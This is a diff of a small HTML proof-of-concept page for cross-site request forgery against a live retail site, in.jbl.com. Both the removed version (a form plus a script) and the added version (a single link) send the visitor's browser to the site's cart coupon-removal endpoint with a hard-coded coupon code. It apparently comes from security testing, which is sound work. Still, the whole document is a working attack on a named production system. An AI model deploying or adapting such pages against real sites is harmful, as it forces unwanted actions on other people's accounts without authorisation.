@@ -1,42 +1,10 @@
-
-<!DOCTYPE html>
 <html>
-<head>
-    <title>JBL CSRF PoC</title>
-</head>
 <body>
-    <h2>JBL Coupon Removal Test</h2>
-
-    <label>Coupon code:</label>
-    <input id="coupon" value="GRAB84ON20CA15">
-
-    <br><br>
-
-    <label>Coupon UUID:</label>
-    <input id="uuid" placeholder="Paste UUID from your own cart">
-
-    <br><br>
-
-    <button onclick="removeCoupon()">Test coupon removal</button>
-
-    <script>
-        function removeCoupon() {
-            const coupon = document.getElementById("coupon").value;
-            const uuid = document.getElementById("uuid").value;
-
-            if (!coupon || !uuid) {
-                alert("Enter coupon code and UUID");
-                return;
-            }
-
-            const url =
-                "https://in.jbl.com/on/demandware.store/" +
-                "Sites-JB-INDIA-Site/en_IN/Cart-RemoveCouponLineItem" +
-                "?code=" + encodeURIComponent(coupon) +
-                "&uuid=" + encodeURIComponent(uuid);
-
-            window.location.href = url;
-        }
-    </script>
+    <h3>CSRF test</h3>
+  
+    <a href="https://in.jbl.com/on/demandware.store/Sites-JB-INDIA-Site/en_IN/Cart-RemoveCouponLineItem?code=GRAB84ON20CA15">
+        Trigger removal test
+    </a>
 </body>
+</html>
 </html>
